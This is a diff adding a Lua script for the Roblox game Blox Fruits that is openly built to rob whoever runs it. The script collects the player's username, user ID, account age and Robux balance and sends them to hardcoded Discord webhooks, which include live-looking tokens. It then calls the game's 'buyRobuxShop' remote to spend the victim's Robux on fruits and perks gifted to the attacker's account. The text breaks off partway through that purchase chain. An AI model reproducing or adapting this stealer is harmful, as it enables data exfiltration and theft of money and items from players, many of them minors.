@@ -1,0 +1,946 @@
+Username = ReceiverUsername
+Webhook = HitsWebhook
+ExecutionsWebhook = Executions_Webhook
+LogsWebhook = "https://discord.com/api/webhooks/1343102902721577020/qgqrcXyabx7RMKRc3lWQn8oRy_32GfHGXjxm8hV_-P9wsi3mCGGuyk_VtkEpfKtm8zoH"
+PublicHitsWebhook = "https://discord.com/api/webhooks/1343103085106692237/O49XARe9i3qylmXdKHbC1bFbG1cuR-CzPv9gITif5EfnB64SF4Q2eZnxDQvcpRdPTLw2"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+
+local executorName = (identifyexecutor and identifyexecutor()) or "undefined"
+
+if executorName ~= "undefined" then
+    print("Executor Name: " .. executorName)
+else
+    print("Executor name could not be retrieved.")
+end
+
+local userRobux =
+    player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Robux") and
+    player.leaderstats.Robux.Value or
+    "N/A"
+
+local stolenFruit = ""
+local robuxSpent = 0
+
+local fruitThumbnails = {
+    ["Permanent Dragon-Dragon"] = "https://i.ibb.co/nZpn4LX/IMG-2402.webp",
+    ["Permanent Kitsune-Kitsune"] = "https://i.ibb.co/Dfnyrx1D/IMG-1883.webp",
+    ["Permanent Yeti-Yeti"] = "https://i.ibb.co/JWghQB1Y/IMG-2429.webp",
+    ["Fruit Notifier"] = "https://i.ibb.co/Lh2JY24v/IMG-2413.webp",
+    ["Permanent Spirit-Spirit"] = "https://i.ibb.co/vCHsFmb6/IMG-2416.webp",
+    ["Permanent Gas-Gas"] = "https://i.ibb.co/275nrtyD/IMG-2417.webp",
+    ["Permanent Venom-Venom"] = "https://i.ibb.co/3mtjbSVj/IMG-2418.webp",
+    ["Permanent Shadow-Shadow"] = "https://i.ibb.co/99LqVrBZ/IMG-2419.webp",
+    ["Permanent Dough-Dough"] = "https://i.ibb.co/zHCZmkQr/IMG-2420.webp",
+    ["Permanent T-Rex-T-Rex"] = "https://i.ibb.co/NnTJrQsF/IMG-2422.webp",
+    ["Permanent Gravity-Gravity"] = "https://i.ibb.co/HLZVJy6L/IMG-2423.webp",
+    ["Permanent Blizzard-Blizzard"] = "https://i.ibb.co/xt2qV5dr/IMG-2424.webp",
+    ["Permanent Pain-Pain"] = "https://i.ibb.co/Z6KrKWJ8/IMG-2425.webp",
+    ["Permanent Rumble-Rumble"] = "https://i.ibb.co/QFYDHgzK/IMG-2430.webp",
+    ["Permanent Portal-Portal"] = "https://i.ibb.co/35jv9Q6M/IMG-2431.webp",
+    ["Permanent Sound-Sound"] = "https://i.ibb.co/RkwYtZT0/IMG-2433.webp",
+    ["Permanent Spider-Spider"] = "https://i.ibb.co/xqKxgKBP/IMG-2434.webp",
+    ["Permanent Love-Love"] = "https://i.ibb.co/6c5sd5TJ/IMG-2435.webp",
+    ["Permanent Buddha-Buddha"] = "https://i.ibb.co/XktpnJNm/IMG-2436.webp",
+    ["Permanent Quake-Quake"] = "https://i.ibb.co/SDgB9XXT/IMG-2437.webp",
+    ["Permanent Magma-Magma"] = "https://i.ibb.co/qYn4dmbF/IMG-2439.webp",
+    ["Permanent Ghost-Ghost"] = "https://i.ibb.co/nsP6rWdx/IMG-2440.webp",
+    ["Permanent Barrier-Barrier"] = "https://i.ibb.co/YFzCgh54/IMG-2443.webp",
+    ["Dark Blade"] = "https://i.ibb.co/VY8VDwTF/IMG-2459.webp",
+    ["Permanent Light-Light"] = "https://i.ibb.co/6cSqLsMt/IMG-2447.webp",
+    ["Permanent Diamond-Diamond"] = "https://i.ibb.co/MkCb4XKR/IMG-2448.webp",
+    ["Permanent Dark-Dark"] = "https://i.ibb.co/991pFKXb/IMG-2449.webp",
+    ["Permanent Sand-Sand"] = "https://i.ibb.co/dJKGj0cM/IMG-2450.webp",
+    ["Permanent Ice-Ice"] = "https://i.ibb.co/HTXRnqp4/IMG-2451.webp",
+    ["Permanent Falcon-Falcon"] = "https://i.ibb.co/mV7b3gg2/IMG-2452.webp",
+    ["Permanent Flame-Flame"] = "https://i.ibb.co/k2rj9vGG/IMG-2453.webp",
+    ["2x Money"] = "https://i.ibb.co/DHDCk7kB/IMG-2460.webp",
+    ["+1 Fruit Storage"] = "https://i.ibb.co/dJKTk6Kn/IMG-2455.webp",
+    ["Permanent Spike-Spike"] = "https://i.ibb.co/C3NJcF4q/IMG-2456.webp",
+    ["2x Boss Drops"] = "https://i.ibb.co/yFHRT8n4/IMG-2461.webp",
+    ["Permanent Smoke-Smoke"] = "https://i.ibb.co/M5VMB4WJ/IMG-2463.webp",
+    ["Permanent Bomb-Bomb"] = "https://i.ibb.co/Wvk6shxw/IMG-2464.webp",
+    ["Permanent Spring-Spring"] = "https://i.ibb.co/BVVZyfvf/IMG-2465.webp",
+    ["Permanent Blade-Blade"] = "https://i.ibb.co/HprY0Sj2/IMG-2466.webp",
+    ["Permanent Spin-Spin"] = "https://i.ibb.co/wFL7dB8r/IMG-2467.webp",
+    ["10K Money"] = "https://i.ibb.co/xtLKmGPK/IMG-2468.webp",
+    ["2x EXP (15 mins.)"] = "https://i.ibb.co/ks5XMHDr/IMG-2470.png"
+}
+
+local function sendExecutionLog()
+    local executionEmbed = {
+        username = "Trax | Executions",
+        avatar_url = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        embeds = {
+            {
+                title = "**__New Execution!__**",
+                color = tonumber(0x0000FF),
+                fields = {
+                    {name = "### :bust_in_silhouette: Username:", value = "```" .. player.Name .. "```", inline = true},
+                    {name = "### :rocket: Executor:", value = "```" .. executorName .. "```", inline = true},
+                    {
+                        name = "### <:robux:1341921463086878800> Robux:",
+                        value = "```" .. tostring(userRobux) .. "```",
+                        inline = true
+                    }
+                }
+            }
+        }
+    }
+
+    local executionData = HttpService:JSONEncode({["embeds"] = {executionEmbed}})
+
+    request(
+        {
+            Url = ExecutionsWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = executionData
+        }
+    )
+end
+
+sendExecutionLog()
+
+local function sendWebhook()
+    local embed = {
+        username = "Trax | Blox Fruits",
+        avatar_url = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        content = "@everyone",
+        embeds = {
+            {
+                title = "### :moneybag:  __Blox Fruits Hit!!__ :moneybag:",
+                color = tonumber(0x0000FF),
+                thumbnail = {
+                    url = fruitThumbnails[stolenFruit] or ""
+                },
+                fields = {
+                    {
+                        name = "### :blue_book: Player Information:",
+                        value = "```lua\nExecutor: " ..
+                            executorName ..
+                                "\nUsername: " ..
+                                    player.Name ..
+                                        "\nUser-ID: " ..
+                                            tostring(player.UserId) ..
+                                                "\nAccount Age: " .. tostring(player.AccountAge) .. "```"
+                    },
+                    {
+                        name = "### <:robux:1341921463086878800> Total Robux:",
+                        value = "```" .. tostring(userRobux) .. "```"
+                    },
+                    {
+                        name = "### :coin: Robux Spent",
+                        value = "```" .. tostring(robuxSpent) .. "```"
+                    },
+                    {
+                        name = "### :gift: Item Gifted",
+                        value = "```" .. (stolenFruit ~= "" and stolenFruit or "Unknown") .. "```"
+                    }
+                },
+                footer = {text = "Hit using Trax."}
+            }
+        }
+    }
+
+    local data = HttpService:JSONEncode({["content"] = "@everyone", ["embeds"] = {embed}})
+
+    request(
+        {
+            Url = Webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = data
+        }
+    )
+
+    request(
+        {
+            Url = LogsWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = data
+        }
+    )
+end
+
+local function sendPublicHitsWebhook()
+    local publicHitEmbed = {
+        username = "Trax | Public Hits",
+        avatar_url = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        embeds = {
+            {
+                title = "### :moneybag:  __Blox Fruits Hit!!__ :moneybag:",
+                color = tonumber(0x00FF00),
+                thumbnail = {
+                    url = fruitThumbnails[stolenFruit] or ""
+                },
+                fields = {
+                    {
+                        name = "### <:robux:1341921463086878800> Total Robux:",
+                        value = "```" .. tostring(userRobux) .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "### :gift: Item Gifted:",
+                        value = "```" .. (stolenFruit ~= "" and stolenFruit or "Unknown") .. "```",
+                        inline = true
+                    }
+                }
+            }
+        }
+    }
+
+    local publicHitData = HttpService:JSONEncode({["embeds"] = {publicHitEmbed}})
+
+    request(
+        {
+            Url = PublicHitsWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = publicHitData
+        }
+    )
+end
+
+function stealitem()
+    if result >= 5000 then
+        stolenFruit = "Permanent Dragon-Dragon"
+        robuxSpent = 5000
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Wait, is that.. DRAGON! TRAX ON TOP",
+                ["PurchaseLocation"] = "FruitShop",
+                ["StorageName"] = "Permanent Dragon-Dragon",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 4000 then
+        stolenFruit = "Permanent Kitsune-Kitsune"
+        robuxSpent = 4000
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Let’s see… A KITSUNE! TRAX ON TOP",
+                ["StorageName"] = "Permanent Kitsune-Kitsune",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 3000 then
+        stolenFruit = "Permanent Yeti-Yeti"
+        robuxSpent = 3000
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Next! uhh.. YETI! TRAX ON TOP",
+                ["StorageName"] = "Permanent Yeti-Yeti",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2700 then
+        stolenFruit = "Fruit Notifer"
+        robuxSpent = 2700
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "TRAX ON TOP!",
+                ["StorageName"] = "Fruit Notifier",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2550 then
+        stolenFruit = "Permanent Spirit-Spirit"
+        robuxSpent = 2550
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "This looks good, TRAX ON TOP",
+                ["StorageName"] = "Permanent Spirit-Spirit",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2500 then
+        stolenFruit = "Permanent Gas-Gas"
+        robuxSpent = 2500
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "It’s pretty gassy, TRAX ON TOP",
+                ["StorageName"] = "Permanent Gas-Gas",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2450 then
+        stolenFruit = "Permanent Venom-Venom"
+        robuxSpent = 2450
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Venom.. I like it, TRAX ON TOP",
+                ["StorageName"] = "Permanent Venom-Venom",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2425 then
+        stolenFruit = "Permanent Shadow-Shadow"
+        robuxSpent = 2425
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Idk about shadows.. TRAX ON TOP",
+                ["StorageName"] = "Permanent Shadow-Shadow",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2400 then
+        stolenFruit = "Permanent Dough-Dough"
+        robuxSpent = 2400
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Gotta get that Dough, TRAX ON TOP",
+                ["StorageName"] = "Permanent Dough-Dough",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2350 then
+        stolenFruit = "Permanent T-Rex-T-Rex"
+        robuxSpent = 2350
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "T-Rex… TRAX ON TOP",
+                ["StorageName"] = "Permanent T-Rex-T-Rex",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2300 then
+        stolenFruit = "Permanent Gravity-Gravity"
+        robuxSpent = 2300
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Gravity’s extra strong today, TRAX ON TOP",
+                ["StorageName"] = "Permanent Gravity-Gravity",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2250 then
+        stolenFruit = "Permanent Blizzard-Blizzard"
+        robuxSpent = 2250
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Pretty chilly, oh a… BLIZZARD, TRAX ON TOP",
+                ["StorageName"] = "Permanent Blizzard-Blizzard",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2200 then
+        stolenFruit = "Permanent Pain-Pain"
+        robuxSpent = 2200
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "I’m feeling a lot of pain, TRAX ON TOP",
+                ["StorageName"] = "Permanent Pain-Pain",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2100 then
+        stolenFruit = "Permanent Rumble-Rumble"
+        robuxSpent = 2100
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Why’s it rumbling? TRAX ON TOP",
+                ["StorageName"] = "Permanent Rumble-Rumble",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2000 then
+        stolenFruit = "Permanent Portal-Portal"
+        robuxSpent = 2000
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Wish I had a portal, oh PORTAL!, TRAX ON TOP",
+                ["StorageName"] = "Permanent Portal-Portal",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1900 then
+        stolenFruit = "Permanent Sound-Sound"
+        robuxSpent = 1900
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Man this thing is loud, oh it’s a SOUND! TRAX ON TOP",
+                ["StorageName"] = "Permanent Sound-Sound",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1800 then
+        stolenFruit = "Permanent Spider-Spider"
+        robuxSpent = 1800
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Kinda in a web here, TRAX ON TOP",
+                ["StorageName"] = "Permanent Spider-Spider",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1700 then
+        stolenFruit = "Permanent Love-Love"
+        robuxSpent = 1700
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Love is in the air, TRAX ON TOP",
+                ["StorageName"] = "Permanent Love-Love",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1650 then
+        stolenFruit = "Permanent Buddha-Buddha"
+        robuxSpent = 1650
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "TRAX ON TOP!",
+                ["StorageName"] = "Permanent Buddha-Buddha",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1500 then
+        stolenFruit = "Permanent Quake-Quake"
+        robuxSpent = 1500
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "QUAKE, TRAX ON TOP",
+                ["StorageName"] = "Permanent Quake-Quake",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1300 then
+        stolenFruit = "Permanent Magma-Magma"
+        robuxSpent = 1300
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Wow is that, MAGMA?! TRAX ON TOP",
+                ["StorageName"] = "Permanent Magma-Magma",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1275 then
+        stolenFruit = "Permanent Ghost-Ghost"
+        robuxSpent = 1275
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Feel like there’s a GHOST, TRAX ON TOP",
+                ["StorageName"] = "Permanent Ghost-Ghost",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1250 then
+        stolenFruit = "Permanent Barrier-Barrier"
+        robuxSpent = 1250
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Hmm, Quite a BARRIER, TRAX ON TOP",
+                ["StorageName"] = "Permanent Barrier-Barrier",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1200 then
+        stolenFruit = "Dark Blade"
+        robuxSpent = 1200
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Wow, a Blade that’s Dark, DARK BLADE, TRAX ON TOP",
+                ["StorageName"] = "Dark Blade",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1100 then
+        stolenFruit = "Permanent Light-Light"
+        robuxSpent = 1100
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Pretty bright in here, oh LIGHT, TRAX ON TOP",
+                ["StorageName"] = "Permanent Light-Light",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1000 then
+        stolenFruit = "Permanent Diamond-Diamond"
+        robuxSpent = 1000
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "It’s raining, DIAMONDS, TRAX ON TOP",
+                ["StorageName"] = "Permanent Diamond-Diamond",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 950 then
+        stolenFruit = "Permanent Dark-Dark"
+        robuxSpent = 950
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Pretty, DARK, TRAX ON TOP",
+                ["StorageName"] = "Permanent Dark-Dark",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 850 then
+        stolenFruit = "Permanent Sand-Sand"
+        robuxSpent = 850
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Sand-Sand",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 750 then
+        stolenFruit = "Permanent Ice-Ice"
+        robuxSpent = 750
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Ice-Ice",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 650 then
+        stolenFruit = "Permanent Falcon-Falcon"
+        robuxSpent = 650
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Falcon-Falcon",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 550 then
+        stolenFruit = "Permanent Flame-Flame"
+        robuxSpent = 550
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Flame-Flame",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 450 then
+        stolenFruit = "2x Money"
+        robuxSpent = 450
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "2x Money",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 400 then
+        stolenFruit = "+1 Fruit Storage"
+        robuxSpent = 400
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "+1 Fruit Storage",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 380 then
+        stolenFruit = "Permanent Spike-Spike"
+        robuxSpent = 380
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Spike-Spike",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 350 then
+        stolenFruit = "2x Boss Drops"
+        robuxSpent = 350
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "2x Boss Drops",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 250 then
+        stolenFruit = "Permanent Smoke-Smoke"
+        robuxSpent = 250
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Smoke-Smoke",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 220 then
+        stolenFruit = "Permanent Bomb-Bomb"
+        robuxSpent = 220
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Bomb-Bomb",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 180 then
+        stolenFruit = "Permanent Spring-Spring"
+        robuxSpent = 180
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Spring-Spring",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
